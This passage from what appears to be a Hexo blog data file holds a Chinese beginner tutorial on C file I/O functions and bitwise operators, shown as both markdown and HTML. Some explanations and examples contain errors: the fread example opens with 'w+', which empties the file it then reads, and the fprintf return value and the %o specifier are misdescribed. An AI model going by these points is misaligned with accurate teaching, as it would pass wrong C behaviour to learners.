[argument])\n```\n\n该函数是一个格式化写入的库函数，可以看到，除了长得和printf函数很像以外，参数也非常像，多了一个第一个参数，文件指针，即第一步打开文件时得到的文件指针，后面的参数和printf一样，按照指定的格式将数据写入文件。例如：\n\n```c\nfprintf(fp,\"%s\",\"www.fbc123.com\");\n```\n\n这句代码的意思是将字符串\"www.fbc123.com\" 以%s的格式写入fp所指向的文件中\n\n| 控制符   | 作用                                      |\n| -------- | ----------------------------------------- |\n| %c       | 字符                                      |\n| %d 或 %i | 有符号十进制整数                          |\n| %e       | 使用 e 字符的科学科学记数法（尾数和指数） |\n| %E       | 使用 E 字符的科学科学记数法（尾数和指数） |\n| %f       | 十进制浮点数                              |\n| %g       | 自动选择 %e 或 %f 中合适的表示法          |\n| %G       | 自动选择 %E 或 %f 中合适的表示法          |\n| %o       | 有符号八进制                              |\n| %s       | 字符的字符串                              |\n| %u       | 无符号十进制整数                          |\n| %x       | 无符号十六进制整数                        |\n| %X       | 无符号十六进制整数（大写字母）            |\n| %p       | 指针地址                                  |\n| %n       | 无输出                                    |\n| %        | 字符                                      |\n\n更多的格式可以参照printf中的格式，可以通用\n\n而返回值为整型，如果写入成功则返回写入字符的格式，否则返回一个负数。\n\n需要注意理解的是，fprintf函数虽然和printf函数很像，表示输出，但准确说是是写入的意思，是指程序向文件里写，要清楚数据的流向。\n\n#### 读文件fscanf函数的用法                \n\n如同printf与scanf的关系一样，fprintf和fscanf也是如此，fprintf负责向文件里写数据，fscanf函数则可以从文件里读数据\n\n它的函数原型如下：\n\n```c\nint fscanf(FILE *stream, char *format[,argument...]);\n```\n\n作为格式化写数据函数，它的参数同样比scanf也多一个参数，即第一个参数文件指针，表示读取的文件目标，其余参数和scanf一样，按照相应的格式进行读取，返回值表示读取数据的字节数。比如：\n\n```c\nchar str[100];\nfscanf(fp,\"%s\",str);\n```\n\n则表示从fp所指向的文件中进行读数据，与空格或换行结束，将结果保存到str数组中\n\n更多scanf的格式如下表：\n\n| 格式        | 作用                                                         |\n| ----------- | ------------------------------------------------------------ |\n| %d          | 读入一个十进制整数                                           |\n| %i          | 读入十进制，八进制，十六进制整数，与%d类似，但是在编译时通过数据前置或后置来区分进制，如加入“0x”则是十六进制，加入“0”则为八进制。例如串“031”使用%d时会被算作31，但是使用%i时会算作25 |\n| %u          | 读入一个无符号十进制整数                                     |\n| %f %F %g %G | 用来输入实数，可以用小数形式或指数形式输入                   |\n| %x %x       | 读入十六进制整数                                             |\n| %o          | 读入八进制整数                                               |\n| %s          | 直到遇到一个空格字符（空格字符可以是空白、换行和制表符）。   |\n| %c          | 单个字符：读取下一个字符。如果指定了一个不为 1 的宽度 width，函数会读取 width 个字符，并通过参数传递，把它们存储在数组中连续位置。在末尾不会追加空字符。 |\n\n#### 写文件fwrite函数的用法                \n\nfwrite函数是写文件的函数，它的函数原型如下：\n\n```c\nsize_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)\n```\n\n可以看到这个函数的参数有四个:\n\n第一个ptr是要写入的数据的头指针，无符号类型；\n\n第二个参数size是大小，表示每个写入元素的大小，单位是字节；\n\n第三个参数nmemb是个数，以上一个参数为单位的个数；\n\n第四个参数stream就是文件指针，表示往哪里写。\n\n至于返回值，如果成功执行，则返回写入元素的个数，如果不和nmemb相等，则表示出错。\n\n```c\n#include<stdio.h>\n int main ()\n{\n   FILE *fp;   \n   char str[] = \"www.fbc123.com\"; \n   fp = fopen( \"fbc123.dat\" , \"w\" );   \n   fwrite(str, sizeof(str) , 1, fp ); \n   fclose(fp);  \n   return(0);\n}\n```\n\n如代码所示，程序运行后，并不会在屏幕上有任何显示，而是将str中的字符串写入了fbc123.dat这个文件中，待程序运行结束退出后，大家可以打开程序同级目录下的fbc123.dat文件对比\n\n#### 读文件fread函数的用法                \n\n与fwrite是一对，读文件的函数fread的函数原型如下：\n\n```c\nsize_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)\n```\n\nfread函数的作用是从文件里读内容到程序中，它的参数意思是：\n\n第一个参数ptr表示盛放内容的首地址\n\n第二个参数size表示每个元素的大小，单位还是字节\n\n第三个参数nmem表示要读取的元素个数\n\n第四个参数stream表示的是文件指针，即从哪个文件中读取\n\n返回值则是表示读取元素的个数，与nmemb一致表示读取成功，否则失败\n\n实例代码如下：\n\n```c\n#include <stdio.h>\n#include <string.h>  \nint main()\n{\n   FILE *fp;\n   char buffer[100];\n   /* 首先打开文件，读写都可以，假设文件中已经有内容为www.fbc123.com */\n   fp = fopen(\"fbc123.dat\", \"w+\"); \n     /* 读取并显示数据 */\n   fread(buffer, 1, 15, fp);\n   printf(\"%s\\n\", buffer);\n   fclose(fp);   \n   return(0);\n}\n```\n\n需要注意文件的打开方式，以及保证文件中有数据，并且buffer空间足够大才可以，大家可以上机实验\n\n#### 关闭文件fclose函数的用法                \n\n对于文件操作的最后一步，这一步的作用主要是断开程序与文件关联，切断IO数据流，释放文件不在占用，结束文件按操作\n\n这一步的操作很简单，用fclose函数完成。如下：\n\n```c\nint fclose( FILE *fp );\n```\n\n其中fp为第一步fopen时成功打开文件后的文件指针；返回值为整型，如成功关闭则返回0，失败则返回-1\n\n如果本步骤不执行，前面的读写文件，可能不会有效果。同时，对win7系统之前，如若不执行本步骤，当试图再次修改如移动打开等操作这个文件的时候就会蹦出“无法修改该文件，该文件已经被xxx打开”的提示，这下我们明白是什么原因了！\n\n### 加一个位运算\n\n与其他运算符不同，C语言中位运算，顾名思义，是以数值的二进制位为单位进行操作的，包含<<（左移）、>>（右移）、~（按位取反）、&（按位与）、|（按位或）、^(按位异或) 共六种运算符。\n\n| 左移运算符   << | 向左（即高位）移位，右侧补0               |\n| --------------- | ----------------------------------------- |\n| 右移运算符   >> | 向右（即低位）移位，左侧补0               |\n| 按位取反     ~  | 如名，即0变1,1变0                         |\n| 按位与      &   | 相对应的两个位都为1则为1，反之为0         |\n| 按位或      \\|  | 相对应的两个位至少有一个为1即为1，反之为0 |\n| 按位异或    ^   | 相对应的两个位相同为0，相异（不同）为1    |\n\n<<和>>运算符，通过箭头方向可以很好的辨别，分别是C语言位运算符中的左移运算符和右移运算符，如表达式13<<2，它的运算过程为：13的用二进制（四个字节，不考虑符号）表示为，0000 0000 0000 0000 0000 0000 0000 1101，那么向左移两位，右侧补0，则变为0000 0000 0000 0000 0000 0000 0011 0100 换成十进制即变为52，大家可以自行验证。\n\n同理，再举一个例子，如表达式25>>3，表示25的二进制位向右移三位，由\n\n0000 0000 0000 0000 0000 0000 0001 1001 变为0000 0000 0000 0000 0000 0000 0000 0011 即十进制3\n\n```c\n#include<stdio.h>\nint main()\n{\n    int a,b;\n    a=13<<2;\n    b=25>>3;\n    printf(\"a=%d,b=%d\\n\",a,b);\n    return 0;\n}\n```\n\n```c\na=52,b=3\n```\n\n**移位运算符的作用：**\n\n​    1.左移N位的本质是乘以2的N次方\n\n​    2.右移N位的本质是除以2的N次方\n\n**&按位与运算符**                \n\n按位与运算符&，有点和前面学过的逻辑与（&&）运算符类似，只有一个&，都是同为1则为1。不同的是按位相互运算。如3&5，运算过程如下：\n\n```c\n3 0000 0000  0000 0000  0000 0000  0000 0011\n5 0000 0000  0000 0000  0000 0000  0000 0101\n& ------------------------------------------\n  0000 0000  0000 0000  0000 0000  0000 0001\n```\n\n可以看到3&5的结果即十进制1\n\n**按位与运算符的作用:**\n\n1. 清零\n\n   我们可以对某一个数与0进行按位与运算，由于两个位都为1才为1，因此最终全部位都变为0，起到清零的作用\n\n2. 取指定位\n\n   如某些存储场景下，“第1~3位表示xxxx“”，我们需要取出1~3位，则可以让原数值与数字7进行按位与运算，得到的结果即是原数值的1~3位的值。\n\n3. 判断奇偶\n\n   可以发现，数字的奇偶取决于二进制位的最低一位是1还是0，因此只需要与1按位与运算，判断是1是0即可得知奇偶。\n\n**|按位或运算符**                \n\n|按位或运算符，同样，它也与我们前面学过的逻辑或运算符类似，只有一个竖线表示，作用位，两个对应的二进制位有一个为1结果即为1。如8|7的运算过程可以如下表示：\n\n```c\n8 0000 0000  0000 0000  0000 0000  0000 1000\n7 0000 0000  0000 0000  0000 0000  0000 0111\n& ------------------------------------------\n  0000 0000  0000 0000  0000 0000  0000 1111\n```\n\n可以看到最终的二进制结果换算成十进制即为15（并不是单纯8+7得来的哦！）\n\n**按位或运算符的作用：**\n\n1. 对一个数字的指定位，置为1\n\n   如“某个数字的第七位”表示开关，原先是0，需要改为1的状态，即可以将这个数字与64按位或，即可得到第七位变为1，其余位的值依旧不变。\n\n**^按位异或运算符**                \n\n^表示按位异或运算符，顾名思义，相异，即不同则为1，反之为0\n\n例如15和16进行异或运算，运算过程如下：\n\n```c\n15 0000 0000  0000 0000  0000 0000  0000 1111\n16 0000 0000  0000 0000  0000 0000  0001 0000\n^ ------------------------------------------\n   0000 0000  0000 0000  0000 0000  0001 1111\n```\n\n可以看到，经过按位异或运算后，其结果变成十进制应为31，大家务必弄清楚运算过程，然后再上机验证，代码如下：\n\n```c\n#include<stdio.h>\nint main()\n{\n    int a;\n    a=15^16;\n    printf(\"a=%d\\n\",a);\n    return 0;\n}\n```\n\n**异或运算符的作用**\n\n指定位数的翻转\n\n如想对某个数字的低4位进行翻转，则可以将这个数字与15（二进制为00001111）进行按位异或运算，既可以将原数字的低四位进行翻转，即高四位不变，低四位0变1,1变0\n\n与0异或还是原值\n\n大家可以自行实验，一个数字与0进行异或，结果还是原值\n\n交换两个数字\n\n除了之前我们学习交换两个数字需要第三个变量做中介之外，如今可以通过异或运算进行，代码如下：\n\n```c\n#include<stdio.h>\nint swap(int *a,int *b)\n{\n    if (*a!=*b)\n    {\n        *a=*a^*b;\n        *b=*b^*a;\n        *a=*a^*b;\n    }\n    return 0;\n}\nint main()\n{\n    int a=5;\n    int b=5;\n    swap(&a,&b);\n    printf(\"a=%d b=%d\\n\",a,b);\n    return 0;\n}\n//a=5 b=5\n```\n\n**~取反运算符**                \n\n~取反运算符，是对数值的二进制位进行取反，是第一个单目运算符，因为只有一个运算对象，运算过程是即0变为1,1变为0，非常好理解。\n\n```c\n#include<stdio.h>\nint main()\n{\n    unsigned int a=1;\n    printf(\"~a=%u\\n\",~a);\n    return 0;\n}\n//~a=4294967294\n```\n\n","slug":"c-文件操作","published":1,"date":"2021-06-29T01:29:39.699Z","updated":"2021-06-29T02:00:44.666Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cksan4n9q0005rouvae5qdz28","content":"<h4 id=\"打开文件fopen函数的用法\"><a href=\"#打开文件fopen函数的用法\" class=\"headerlink\" title=\"打开文件fopen函数的用法\"></a>打开文件fopen函数的用法</h4><p>在C语言中，对文件操作之前，首先需要打开文件，使用的函数是fopen函数，它的作用是打开文件，获取该文件的文件指针，方便后续操作。函数原型为: </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">FILE *<span class=\"title\">fopen</span><span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *filename, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *mode)</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p>可以看得出来，该函数需要两个字符串类型的参数，第一个是文件名，既要操作的文件对象。第二个是打开方式，这里的打开方式只是，对文件以何种模式打开，包括文本模式打开还是二进制打开、是读还是写还是追加等等等等,具体类型如下表，可以根据情况使用：</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>r</td>\n<td>以只读方式打开文件，该文件必须存在。</td>\n</tr>\n<tr>\n<td>r+</td>\n<td>以读/写方式打开文件，该文件必须存在。</td>\n</tr>\n<tr>\n<td>rb+</td>\n<td>以读/写方式打开一个二进制文件，只允许读/写数据。</td>\n</tr>\n<tr>\n<td>rt+</td>\n<td>以读/写方式打开一个文本文件，允许读和写。</td>\n</tr>\n<tr>\n<td>w</td>\n<td>打开只写文件，若文件存在则文件长度清为零，即该文件内容会消失；若文件不存在则创建该文件。</td>\n</tr>\n<tr>\n<td>w+</td>\n<td>打开可读/写文件，若文件存在则文件长度清为零，即该文件内容会消失；若文件不存在则创建该文件。</td>\n</tr>\n<tr>\n<td>a</td>\n<td>以附加的方式打开只写文件。若文件不存在，则会创建该文件；如果文件存在，则写入的数据会被加到文件尾后，即文件原先的内容会被保留（EOF 符保留）。</td>\n</tr>\n<tr>\n<td>a+</td>\n<td>以附加方式打开可读/写的文件。若文件不存在，则会创建该文件，如果文件存在，则写入的数据会被加到文件尾后，即文件原先的内容会被保留（EOF符不保留）。</td>\n</tr>\n<tr>\n<td>wb</td>\n<td>以只写方式打开或新建一个二进制文件，只允许写数据。</td>\n</tr>\n<tr>\n<td>wb+</td>\n<td>以读/写方式打开或新建一个二进制文件，允许读和写。</td>\n</tr>\n<tr>\n<td>wt+</td>\n<td>以读/写方式打开或新建一个文本文件，允许读和写。</td>\n</tr>\n<tr>\n<td>at+</td>\n<td>以读/写方式打开一个文本文件，允许读或在文本末追加数据。</td>\n</tr>\n<tr>\n<td>ab+</td>\n<td>以读/写方式打开一个二进制文件，允许读或在文件末追加数据。</td>\n</tr>\n</tbody></table>\n<p>函数的返回值则表示打开成功后的文件指针，格式为FILE类型，是一个结构体类型，供后面使用，如果打开失败，则返回NULL</p>\n<p>FILE结构体类型虽用不到，但可以了解，定义如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span> </span><br><span class=\"line\">　　<span class=\"keyword\">int</span> level;　　　　　　　　　　　``<span class=\"comment\">/* fill/empty level of buffer */</span></span><br><span class=\"line\">　　<span class=\"keyword\">unsigned</span> flags; 　　　　　 ``<span class=\"comment\">/* File status flags */</span></span><br><span class=\"line\">　　<span class=\"keyword\">char</span> fd;　　　　　　　　　　　 ``<span class=\"comment\">/* File descriptor */</span></span><br><span class=\"line\">　　<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> hold;　　　　 ``<span class=\"comment\">/* Ungetc char if no buffer */</span></span><br><span class=\"line\">　　<span class=\"keyword\">int</span> bsize;　　　　　　　　　　 ``<span class=\"comment\">/* Buffer size */</span></span><br><span class=\"line\">　　<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> _FAR *buffer;　``<span class=\"comment\">/* Data transfer buffer */</span></span><br><span class=\"line\">　　<span class=\"keyword\">unsigned</span>  <span class=\"keyword\">char</span> _FAR *curp;　　``<span class=\"comment\">/* Current active pointer */</span></span><br><span class=\"line\">　　<span class=\"keyword\">unsigned</span> istemp;　　　　　　``<span class=\"comment\">/* Temporary file indicator */</span></span><br><span class=\"line\">　　<span class=\"keyword\">short</span> token;　　　　　　　　 ``<span class=\"comment\">/* Used for validity checking */</span></span><br><span class=\"line\">&#125;FILE;　　　　　　　　　　　　 ``<span class=\"comment\">/* This is the FILE object */</span></span><br></pre></td></tr></table></figure>\n\n<p>比如，如果我们现在想打开一个D盘根目录下的abc.dat，并且想读出该文件里的数据，那么我们可以这样写：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FILE *fp;</span><br><span class=\"line\">fp=fopen(<span class=\"string\">&quot;d:\\\\abc.dat&quot;</span>,<span class=\"string\">&quot;r&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">//后面通过fp指针开始读文件</span></span><br></pre></td></tr></table></figure>\n\n<p>值得说明的是</p>\n<p>1.该文件的目录是绝对路径，因此这样写，如果不写盘符比如abc.dat则表示相对路径，表示与本程序同目录下。</p>\n<p>2.路径中的反斜杠虽然只有一个，但这里打了两个，原因在于C语言字符串中对反斜杠要当作转义字符处理，因此要用两个反斜杠才能表示一个。</p>\n<p>3.一旦以r也就是只读的方式打开文件，后面则不允许写数据，否则会出错，一定要保持一致！</p>\n<h4 id=\"写文件fprintf函数的用法\"><a href=\"#写文件fprintf函数的用法\" class=\"headerlink\" title=\"写文件fprintf函数的用法\"></a>写文件fprintf函数的用法</h4><p>我们学会了打开文件之后，如果打开模式是写，那么可以用fprintf函数来进行写，下面来介绍fprintf函数，它的原型是：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">fprintf</span> <span class=\"params\">(FILE* stream, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span>*format, [argument])</span></span></span><br></pre></td></tr></table></figure>\n\n<p>该函数是一个格式化写入的库函数，可以看到，除了长得和printf函数很像以外，参数也非常像，多了一个第一个参数，文件指针，即第一步打开文件时得到的文件指针，后面的参数和printf一样，按照指定的格式将数据写入文件。例如：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">fprintf</span>(fp,<span class=\"string\">&quot;%s&quot;</span>,<span class=\"string\">&quot;www.fbc123.com&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>这句代码的意思是将字符串”<a href=\"http://www.fbc123.com&quot;/\">www.fbc123.com&quot;</a> 以%s的格式写入fp所指向的文件中</p>\n<table>\n<thead>\n<tr>\n<th>控制符</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>%c</td>\n<td>字符</td>\n</tr>\n<tr>\n<td>%d 或 %i</td>\n<td>有符号十进制整数</td>\n</tr>\n<tr>\n<td>%e</td>\n<td>使用 e 字符的科学科学记数法（尾数和指数）</td>\n</tr>\n<tr>\n<td>%E</td>\n<td>使用 E 字符的科学科学记数法（尾数和指数）</td>\n</tr>\n<tr>\n<td>%f</td>\n<td>十进制浮点数</td>\n</tr>\n<tr>\n<td>%g</td>\n<td>自动选择 %e 或 %f 中合适的表示法</td>\n</tr>\n<tr>\n<td>%G</td>\n<td>自动选择 %E 或 %f 中合适的表示法</td>\n</tr>\n<tr>\n<td>%o</td>\n<td>有符号八进制</td>\n</tr>\n<tr>\n<td>%s</td>\n<td>字符的字符串</td>\n</tr>\n<tr>\n<td>%u</td>\n<td>无符号十进制整数</td>\n</tr>\n<tr>\n<td>%x</td>\n<td>无符号十六进制整数</td>\n</tr>\n<tr>\n<td>%X</td>\n<td>无符号十六进制整数（大写字母）</td>\n</tr>\n<tr>\n<td>%p</td>\n<td>指针地址</td>\n</tr>\n<tr>\n<td>%n</td>\n<td>无输出</td>\n</tr>\n<tr>\n<td>%</td>\n<td>字符</td>\n</tr>\n</tbody></table>\n<p>更多的格式可以参照printf中的格式，可以通用</p>\n<p>而返回值为整型，如果写入成功则返回写入字符的格式，否则返回一个负数。</p>\n<p>需要注意理解的是，fprintf函数虽然和printf函数很像，表示输出，但准确说是是写入的意思，是指程序向文件里写，要清楚数据的流向。</p>\n<h4 id=\"读文件fscanf函数的用法\"><a href=\"#读文件fscanf函数的用法\" class=\"headerlink\" title=\"读文件fscanf函数的用法\"></a>读文件fscanf函数的用法</h4><p>如同printf与scanf的关系一样，fprintf和fscanf也是如此，fprintf负责向文件里写数据，fscanf函数则可以从文件里读数据</p>\n<p>它的函数原型如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">fscanf</span><span class=\"params\">(FILE *stream, <span class=\"keyword\">char</span> *format[,argument...])</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p>作为格式化写数据函数，它的参数同样比scanf也多一个参数，即第一个参数文件指针，表示读取的文件目标，其余参数和scanf一样，按照相应的格式进行读取，返回值表示读取数据的字节数。比如：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">char</span> str[<span class=\"number\">100</span>];</span><br><span class=\"line\"><span class=\"built_in\">fscanf</span>(fp,<span class=\"string\">&quot;%s&quot;</span>,str);</span><br></pre></td></tr></table></figure>\n\n<p>则表示从fp所指向的文件中进行读数据，与空格或换行结束，将结果保存到str数组中</p>\n<p>更多scanf的格式如下表：</p>\n<table>\n<thead>\n<tr>\n<th>格式</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>%d</td>\n<td>读入一个十进制整数</td>\n</tr>\n<tr>\n<td>%i</td>\n<td>读入十进制，八进制，十六进制整数，与%d类似，但是在编译时通过数据前置或后置来区分进制，如加入“0x”则是十六进制，加入“0”则为八进制。例如串“031”使用%d时会被算作31，但是使用%i时会算作25</td>\n</tr>\n<tr>\n<td>%u</td>\n<td>读入一个无符号十进制整数</td>\n</tr>\n<tr>\n<td>%f %F %g %G</td>\n<td>用来输入实数，可以用小数形式或指数形式输入</td>\n</tr>\n<tr>\n<td>%x %x</td>\n<td>读入十六进制整数</td>\n</tr>\n<tr>\n<td>%o</td>\n<td>读入八进制整数</td>\n</tr>\n<tr>\n<td>%s</td>\n<td>直到遇到一个空格字符（空格字符可以是空白、换行和制表符）。</td>\n</tr>\n<tr>\n<td>%c</td>\n<td>单个字符：读取下一个字符。如果指定了一个不为 1 的宽度 width，函数会读取 width 个字符，并通过参数传递，把它们存储在数组中连续位置。在末尾不会追加空字符。</td>\n</tr>\n</tbody></table>\n<h4 id=\"写文件fwrite函数的用法\"><a href=\"#写文件fwrite函数的用法\" class=\"headerlink\" title=\"写文件fwrite函数的用法\"></a>写文件fwrite函数的用法</h4><p>fwrite函数是写文件的函数，它的函数原型如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">size_t</span> <span class=\"title\">fwrite</span><span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"keyword\">void</span> *ptr, <span class=\"keyword\">size_t</span> size, <span class=\"keyword\">size_t</span> nmemb, FILE *stream)</span></span></span><br></pre></td></tr></table></figure>\n\n<p>可以看到这个函数的参数有四个:</p>\n<p>第一个ptr是要写入的数据的头指针，无符号类型；</p>\n<p>第二个参数size是大小，表示每个写入元素的大小，单位是字节；</p>\n<p>第三个参数nmemb是个数，以上一个参数为单位的个数；</p>\n<p>第四个参数stream就是文件指针，表示往哪里写。</p>\n<p>至于返回值，如果成功执行，则返回写入元素的个数，如果不和nmemb相等，则表示出错。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">   FILE *fp;   </span><br><span class=\"line\">   <span class=\"keyword\">char</span> str[] = <span class=\"string\">&quot;www.fbc123.com&quot;</span>; </span><br><span class=\"line\">   fp = fopen( <span class=\"string\">&quot;fbc123.dat&quot;</span> , <span class=\"string\">&quot;w&quot;</span> );   </span><br><span class=\"line\">   fwrite(str, <span class=\"keyword\">sizeof</span>(str) , <span class=\"number\">1</span>, fp ); </span><br><span class=\"line\">   fclose(fp);  </span><br><span class=\"line\">   <span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如代码所示，程序运行后，并不会在屏幕上有任何显示，而是将str中的字符串写入了fbc123.dat这个文件中，待程序运行结束退出后，大家可以打开程序同级目录下的fbc123.dat文件对比</p>\n<h4 id=\"读文件fread函数的用法\"><a href=\"#读文件fread函数的用法\" class=\"headerlink\" title=\"读文件fread函数的用法\"></a>读文件fread函数的用法</h4><p>与fwrite是一对，读文件的函数fread的函数原型如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">size_t</span> <span class=\"title\">fread</span><span class=\"params\">(<span class=\"keyword\">void</span> *ptr, <span class=\"keyword\">size_t</span> size, <span class=\"keyword\">size_t</span> nmemb, FILE *stream)</span></span></span><br></pre></td></tr></table></figure>\n\n<p>fread函数的作用是从文件里读内容到程序中，它的参数意思是：</p>\n<p>第一个参数ptr表示盛放内容的首地址</p>\n<p>第二个参数size表示每个元素的大小，单位还是字节</p>\n<p>第三个参数nmem表示要读取的元素个数</p>\n<p>第四个参数stream表示的是文件指针，即从哪个文件中读取</p>\n<p>返回值则是表示读取元素的个数，与nmemb一致表示读取成功，否则失败</p>\n<p>实例代码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span>  </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">   FILE *fp;</span><br><span class=\"line\">   <span class=\"keyword\">char</span> buffer[<span class=\"number\">100</span>];</span><br><span class=\"line\">   <span class=\"comment\">/* 首先打开文件，读写都可以，假设文件中已经有内容为www.fbc123.com */</span></span><br><span class=\"line\">   fp = fopen(<span class=\"string\">&quot;fbc123.dat&quot;</span>, <span class=\"string\">&quot;w+&quot;</span>); </span><br><span class=\"line\">     <span class=\"comment\">/* 读取并显示数据 */</span></span><br><span class=\"line\">   fread(buffer, <span class=\"number\">1</span>, <span class=\"number\">15</span>, fp);</span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>, buffer);</span><br><span class=\"line\">   fclose(fp);   </span><br><span class=\"line\">   <span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>需要注意文件的打开方式，以及保证文件中有数据，并且buffer空间足够大才可以，大家可以上机实验</p>\n<h4 id=\"关闭文件fclose函数的用法\"><a href=\"#关闭文件fclose函数的用法\" class=\"headerlink\" title=\"关闭文件fclose函数的用法\"></a>关闭文件fclose函数的用法</h4><p>对于文件操作的最后一步，这一步的作用主要是断开程序与文件关联，切断IO数据流，释放文件不在占用，结束文件按操作</p>\n<p>这一步的操作很简单，用fclose函数完成。如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">fclose</span><span class=\"params\">( FILE *fp )</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p>其中fp为第一步fopen时成功打开文件后的文件指针；返回值为整型，如成功关闭则返回0，失败则返回-1</p>\n<p>如果本步骤不执行，前面的读写文件，可能不会有效果。同时，对win7系统之前，如若不执行本步骤，当试图再次修改如移动打开等操作这个文件的时候就会蹦出“无法修改该文件，该文件已经被xxx打开”的提示，这下我们明白是什么原因了！</p>\n<h3 id=\"加一个位运算\"><a href=\"#加一个位运算\" class=\"headerlink\" title=\"加一个位运算\"></a>加一个位运算</h3><p>与其他运算符不同，C语言中位运算，顾名思义，是以数值的二进制位为单位进行操作的，包含&lt;&lt;（左移）、&gt;&gt;（右移）、~（按位取反）、&amp;（按位与）、|（按位或）、^(按位异或) 共六种运算符。</p>\n<table>\n<thead>\n<tr>\n<th>左移运算符   &lt;&lt;</th>\n<th>向左（即高位）移位，右侧补0</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>右移运算符   &gt;&gt;</td>\n<td>向右（即低位）移位，左侧补0</td>\n</tr>\n<tr>\n<td>按位取反     ~</td>\n<td>如名，即0变1,1变0</td>\n</tr>\n<tr>\n<td>按位与      &amp;</td>\n<td>相对应的两个位都为1则为1，反之为0</td>\n</tr>\n<tr>\n<td>按位或      |</td>\n<td>相对应的两个位至少有一个为1即为1，反之为0</td>\n</tr>\n<tr>\n<td>按位异或    